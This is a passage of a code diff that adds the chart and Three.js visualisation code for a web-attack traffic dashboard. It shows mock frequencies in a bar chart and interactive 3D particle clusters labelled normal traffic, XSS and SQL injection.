+                         data: [5200, 4800, 3100, 2900, 2100], // Mock frequencies
+                         backgroundColor: [
+                             'rgba(245, 158, 11, 0.7)', // XSS term
+                             'rgba(239, 68, 68, 0.7)',  // SQLi term
+                             'rgba(245, 158, 11, 0.7)', // XSS term
+                             'rgba(239, 68, 68, 0.7)',  // SQLi term
+                             'rgba(245, 158, 11, 0.7)', // XSS term
+                         ],
+                         borderRadius: 4
+                     }]
+                 },
+                 options: {
+                     indexAxis: 'y', // Makes it horizontal
+                     responsive: true,
+                     maintainAspectRatio: false,
+                     scales: {
+                         x: { grid: { color: 'rgba(255,255,255,0.05)' }, beginAtZero: true },
+                         y: { grid: { display: false } }
+                     },
+                     plugins: {
+                         legend: { display: false }, // Hide legend, color coding is obvious
+                         tooltip: {
+                            callbacks: {
+                                label: function(context) {
+                                    let type = context.dataIndex % 2 === 0 ? "XSS Vector" : "SQLi Vector";
+                                    if(context.dataIndex === 0) type = "XSS Vector";
+                                    if(context.dataIndex === 1) type = "SQLi Vector";
+                                    if(context.dataIndex === 2) type = "XSS Vector";
+                                    if(context.dataIndex === 3) type = "SQLi Vector";
+                                    if(context.dataIndex === 4) type = "XSS Vector";
+                                    return ` ${context.raw} occurrences (${type})`;
+                                }
+                            }
+                         }
+                     }
+                 }
+             });
+
+            // 3. Three.js Interactive Setup
+            const container = document.getElementById('threejs-container');
+            const scene = new THREE.Scene();
+            
+            // Richer fog for deep space effect
+            scene.fog = new THREE.FogExp2(0x050810, 0.012);
+            
+            let width = container.clientWidth;
+            let height = container.clientHeight;
+
+            const camera = new THREE.PerspectiveCamera(60, width / height, 0.1, 1000);
+            camera.position.set(0, 25, 75); // Pulled back slightly for better framing
+
+            const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
+            renderer.setSize(width, height);
+            renderer.setPixelRatio(window.devicePixelRatio);
+            container.appendChild(renderer.domElement);
+
+            const controls = new THREE.OrbitControls(camera, renderer.domElement);
+            controls.enableDamping = true;
+            controls.dampingFactor = 0.05;
+            controls.autoRotate = true;
+            controls.autoRotateSpeed = 1.0; // Slightly slower, more elegant rotation
+
+            // Add a futuristic glowing grid floor
+            const gridHelper = new THREE.GridHelper(150, 30, 0x3b82f6, 0x1e293b);
+            gridHelper.position.y = -30;
+            gridHelper.material.transparent = true;
+            gridHelper.material.opacity = 0.3;
+            scene.add(gridHelper);
+
+            // Add subtle background "data dust" (stars)
+            const starGeo = new THREE.BufferGeometry();
+            const starPos = new Float32Array(1500 * 3);
+            for(let i=0; i<1500*3; i++) {
+                starPos[i] = (Math.random() - 0.5) * 200;
+            }
+            starGeo.setAttribute('position', new THREE.BufferAttribute(starPos, 3));
+            const starMat = new THREE.PointsMaterial({color: 0x334155, size: 0.5, transparent: true, opacity: 0.5});
+            const stars = new THREE.Points(starGeo, starMat);
+            scene.add(stars);
+
+            // Enhanced function to create organic, nebula-like clusters
+            function createCluster(count, colorHex, center, radius, size) {
+                const geometry = new THREE.BufferGeometry();
+                const positions = new Float32Array(count * 3);
+                
+                for (let i = 0; i < count * 3; i += 3) {
+                    // Spherical coordinates with Gaussian distribution for a dense core and soft edges
+                    const u = Math.random();
+                    const v = Math.random();
+                    const theta = u * 2.0 * Math.PI;
+                    const phi = Math.acos(2.0 * v - 1.0);
+                    // Bell curve math (sum of 4 randoms) to cluster points near the center
+                    const r = (Math.random() + Math.random() + Math.random() + Math.random() - 2) * radius; 
+
+                    positions[i] = center.x + r * Math.sin(phi) * Math.cos(theta);
+                    positions[i+1] = center.y + r * Math.sin(phi) * Math.sin(theta);
+                    positions[i+2] = center.z + r * Math.cos(phi);
+                }
+                
+                geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+                
+                // Create a premium glowing texture using canvas
+                const canvas = document.createElement('canvas');
+                canvas.width = 32; canvas.height = 32;
+                const context = canvas.getContext('2d');
+                const gradient = context.createRadialGradient(16, 16, 0, 16, 16, 16);
+                gradient.addColorStop(0, 'rgba(255,255,255,1)'); // Solid white core
+                gradient.addColorStop(0.2, 'rgba(255,255,255,0.8)'); // Soft inner glow
+                gradient.addColorStop(0.5, 'rgba(255,255,255,0.2)'); // Colored mid glow (color applied via material)
+                gradient.addColorStop(1, 'rgba(0,0,0,0)'); // Transparent edge
+                
+                context.fillStyle = gradient;
+                context.fillRect(0, 0, 32, 32);
+                const texture = new THREE.CanvasTexture(canvas);
+
+                const material = new THREE.PointsMaterial({
+                    color: colorHex,
+                    size: size,
+                    map: texture,
+                    transparent: true,
+                    opacity: 0.9,
+                    depthWrite: false, // Prevents dark halos around overlapping transparent particles
+                    blending: THREE.AdditiveBlending // Creates the neon/holographic glow effect
+                });
+                
+                const points = new THREE.Points(geometry, material);
+                // Wrap in a group to allow local rotation around the center
+                const group = new THREE.Group();
+                group.add(points);
+                // Store center so raycaster hit detection works correctly on the points
+                points.userData = { parentGroup: group }; 
+                return group;
+            }
+
+            // Normal Traffic (Green) - Tightly packed near origin
+            const normalGroup = createCluster(1200, 0x10b981, {x: -5, y: -15, z: -10}, 15, 2.5);
+            scene.add(normalGroup);
+
+            // XSS (Yellow) - Dispersed in upper left
+            const xssGroup = createCluster(1500, 0xf59e0b, {x: -25, y: 15, z: 15}, 20, 2.0);
+            scene.add(xssGroup);
+
+            // SQLi (Red) - Stretched out in right area
+            const sqliGroup = createCluster(2000, 0xef4444, {x: 25, y: 5, z: -5}, 22, 2.0);
+            scene.add(sqliGroup);
+
+            // Extract the actual Points objects for raycasting
+            const normalPoints = normalGroup.children[0];
+            const xssPoints = xssGroup.children[0];
+            const sqliPoints = sqliGroup.children[0];
+
+            // Connect HTML controls
+            const toggleNormal = document.getElementById('toggle-normal');
+            const toggleXSS = document.getElementById('toggle-xss');
+            const toggleSQLi = document.getElementById('toggle-sqli');
+            const speedSlider = document.getElementById('speed-slider');
+            
+            let isHovering3D = false;
+
+            toggleNormal.addEventListener('change', (e) => { normalGroup.visible = e.target.checked; });
+            toggleXSS.addEventListener('change', (e) => { xssGroup.visible = e.target.checked; });
+            toggleSQLi.addEventListener('change', (e) => { sqliGroup.visible = e.target.checked; });
+
+            speedSlider.addEventListener('input', (e) => {
+                const speed = parseFloat(e.target.value);
+                controls.autoRotateSpeed = speed;
+                controls.autoRotate = speed > 0 && !isHovering3D; 
+            });
+
+            window.addEventListener('resize', () => {
+                width = container.clientWidth;
+                height = container.clientHeight;
+                renderer.setSize(width, height);
+                camera.aspect = width / height;
+                camera.updateProjectionMatrix();
+            });
+
+            // Raycasting for Tooltips
+            const raycaster = new THREE.Raycaster();
+            raycaster.params.Points.threshold = 2.0; // Easier to hover
+            const mouse = new THREE.Vector2();
+            
+            const tooltip = document.getElementById('3d-tooltip');
+            const tooltipContent = document.getElementById('tooltip-content');
+
+            container.addEventListener('mouseenter', () => {
+                isHovering3D = true;
+                controls.autoRotate = false;
+            });
+            
+            container.addEventListener('mouseleave', () => {
+                isHovering3D = false;
+                controls.autoRotate = parseFloat(speedSlider.value) > 0;
+                
+                tooltip.style.opacity = '0';
+                setTimeout(() => { if(!isHovering3D) tooltip.classList.add('hidden'); }, 150);
+            });
+
+            container.addEventListener('mousemove', (event) => {
+                const rect = container.getBoundingClientRect();
+                mouse.x = ((event.clientX - rect.left) / width) * 2 - 1;
+                mouse.y = -((event.clientY - rect.top) / height) * 2 + 1;
+
+                tooltip.style.left = (event.clientX - rect.left) + 'px';
+                tooltip.style.top = (event.clientY - rect.top) + 'px';
+            });
+
+            // Animation Loop
+            let lastHovered = null;
+
+            function animate() {
+                requestAnimationFrame(animate);
+                
+                const time = Date.now() * 0.0005;
+                
+                // Add internal rotation to the clusters themselves
+                normalGroup.rotation.y += 0.001;
+                normalGroup.rotation.x += 0.0005;
+                
+                xssGroup.rotation.y -= 0.0015;
+                xssGroup.rotation.z += 0.0005;
+                
+                sqliGroup.rotation.x += 0.001;
+                sqliGroup.rotation.y += 0.001;
+
+                // Subtle floating effect if not hovering
+                if (!isHovering3D) {
+                    normalGroup.position.y = Math.sin(time) * 2;
+                    xssGroup.position.y = Math.cos(time * 0.8) * 3;
+                    sqliGroup.position.y = Math.sin(time * 1.2) * 2;
+                }
+                
+                // Perform Raycasting against the Points objects, not the Groups
+                raycaster.setFromCamera(mouse, camera);
+                const intersects = raycaster.intersectObjects([normalPoints, xssPoints, sqliPoints], false);
+                
+                if (intersects.length > 0) {
+                    const hitObject = intersects[0].object;
+                    
+                    tooltip.classList.remove('hidden');
+                    requestAnimationFrame(() => { tooltip.style.opacity = '1'; });
+                    
+                    if (hitObject === normalPoints && lastHovered !== 'normal') {
+                        tooltipContent.innerHTML = '<span class="text-emerald-500 text-lg leading-none">&bull;</span> Normal Traffic Cluster';
+                        tooltip.style.borderColor = 'rgba(16, 185, 129, 0.5)';
+                        lastHovered = 'normal';
+                    } else if (hitObject === xssPoints && lastHovered !== 'xss') {
+                        tooltipContent.innerHTML = '<span class="text-amber-500 text-lg leading-none">&bull;</span> XSS Attack Cluster';
+                        tooltip.style.borderColor = 'rgba(245, 158, 11, 0.5)';
+                        lastHovered = 'xss';
+                    } else if (hitObject === sqliPoints && lastHovered !== 'sqli') {
+                        tooltipContent.innerHTML = '<span class="text-red-500 text-lg leading-none">&bull;</span> SQLi Attack Cluster';
+                        tooltip.style.borderColor = 'rgba(239, 68, 68, 0.5)';
+                        lastHovered = 'sqli';
+                    }
+                } else {
+                    tooltip.style.opacity = '0';
+                    lastHovered = null;
+                    if(!tooltip.classList.contains('hidden')) {
+                        setTimeout(() => {
+                            if(tooltip.style.opacity === '0') tooltip.classList.add('hidden');
+                        }, 150);
+                    }
+                }
+
+                controls.update();
+                renderer.render(scene, camera);
+            }
+            
+            animate();
+        });
+    </script>
+</body>
+</html>
